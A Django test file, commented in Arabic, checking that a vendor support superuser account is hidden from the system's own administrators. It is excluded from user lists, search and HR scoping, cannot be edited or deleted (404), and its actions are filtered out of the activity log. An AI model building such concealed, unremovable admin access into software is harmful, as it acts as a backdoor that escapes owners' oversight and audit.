from django.test import TestCase, Client
from django.urls import reverse
from django.contrib.auth import get_user_model
from users.models import Role, ActivityLog
from users.services.user_management_service import UserManagementService
from users.services.data_scoping_service import DataScopingService
from hr.services.user_employee_service import UserEmployeeService

User = get_user_model()


class HiddenSystemUserTests(TestCase):
    """
    اختبارات التحقق الصارم من إخفاء حسابات الدعم الفني والنظام الخاصة (mwheba / info@mwheba.com)
    عن كافة القوائم، الإحصائيات، وسجلات النشاط ونطاقات الاختيار في النظام.
    """

    def setUp(self):
        self.client = Client()
        self.admin_role, _ = Role.objects.get_or_create(
            name='admin',
            defaults={'display_name': 'مدير النظام', 'is_system_role': True}
        )
        
        # مستخدم عادي ظاهر
        self.visible_admin = User.objects.create_superuser(
            username='main_admin_test',
            email='admin_test@company.com',
            password='password123',
            role=self.admin_role
        )
        self.visible_user = User.objects.create_user(
            username='ahmed_sales_test',
            email='ahmed_test@company.com',
            password='password123'
        )
        
        # المستخدم المطلوب إخفاؤه
        self.hidden_user = User.objects.create_superuser(
            username='mwheba',
            email='info@mwheba.com',
            password='password123',
            role=self.admin_role
        )

    def test_user_list_view_excludes_hidden_user(self):
        self.client.force_login(self.visible_admin)
        response = self.client.get(reverse('users:user_list'))
        self.assertEqual(response.status_code, 200)
        users_in_context = list(response.context['users'].object_list)
        usernames = [u.username for u in users_in_context]
        
        self.assertIn('main_admin_test', usernames)
        self.assertIn('ahmed_sales_test', usernames)
        self.assertNotIn('mwheba', usernames)

    def test_user_management_service_stats_and_search_excludes_hidden_user(self):
        service = UserManagementService()
        
        # فحص البحث
        results = service.perform_operation('search_users', query='mwheba')
        self.assertEqual(len(results), 0)

    def test_direct_actions_on_hidden_user_return_404(self):
        self.client.force_login(self.visible_admin)
        
        # محاولة فتح صفحة التعديل
        edit_response = self.client.get(reverse('users:user_edit', kwargs={'user_id': self.hidden_user.id}))
        self.assertEqual(edit_response.status_code, 404)
        
        # محاولة تغيير الحالة
        toggle_response = self.client.post(reverse('users:user_toggle_status', kwargs={'user_id': self.hidden_user.id}))
        self.assertEqual(toggle_response.status_code, 404)
        
        # محاولة الحذف
        delete_response = self.client.post(reverse('users:user_delete', kwargs={'user_id': self.hidden_user.id}))
        self.assertEqual(delete_response.status_code, 404)

    def test_data_scoping_and_hr_unlinked_excludes_hidden_user(self):
        salesmen = DataScopingService.get_scoped_salesmen()
        self.assertFalse(salesmen.filter(username='mwheba').exists())
        
        unlinked = UserEmployeeService.get_unlinked_users()
        self.assertFalse(unlinked.filter(username='mwheba').exists())

    def test_activity_log_view_excludes_hidden_user(self):
        ActivityLog.objects.create(
            user=self.hidden_user,
            action='SECRET_OPERATION',
            model_name='User'
        )
        ActivityLog.objects.create(
            user=self.visible_admin,
            action='VISIBLE_OPERATION',
            model_name='User'
        )
        
        self.client.force_login(self.visible_admin)
        response = self.client.get(reverse('users:activity_log'))
        self.assertEqual(response.status_code, 200)
        activities = list(response.context['activities'])
        actions = [a.action for a in activities]
        self.assertNotIn('SECRET_OPERATION', actions)
        self.assertIn('VISIBLE_OPERATION', actions)
